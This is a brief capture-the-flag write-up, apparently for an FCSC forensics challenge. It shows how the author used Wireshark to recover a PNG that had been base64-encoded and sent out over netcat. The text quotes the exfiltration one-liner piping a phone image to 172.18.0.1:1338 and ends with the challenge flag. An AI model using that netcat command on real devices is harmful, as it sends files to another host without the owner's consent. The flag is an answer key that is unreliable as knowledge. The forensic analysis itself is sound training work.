Analyzing the file with wireshark, searching data field for the word "FCSC" doesnt yield anything

Searching for flag gives an interesting command : 

`cat /sdcard/DCIM/flag.png | base64 | nc 172.18.0.1 1338`

so we analyze the data sent to that address at that port to get back the image

we put the following rule to see what the guy told us to do

`ip.dst == 10.0.2.16 && ip.src == 172.18.0.1 && tcp.port == 1338`

and this one to see what we replied

`ip.src == 10.0.2.16 && ip.dst == 172.18.0.1 && tcp.port == 1338`

We find a large amount of packets, with one stream being extremely long and base64-looking data

Right clic > follow TCP stream gives us the whole b64 data, we save it as flag.b64

Then it's just a matter of converting back to png until we can open it

`base64 -d flag.b64 > flag.png`

a cool cat and a flag (but no meme this time, our CEO is a serious guy :'()

FCSC{2d47d546d4f919e2d50621829a8bd696d3cd1938}
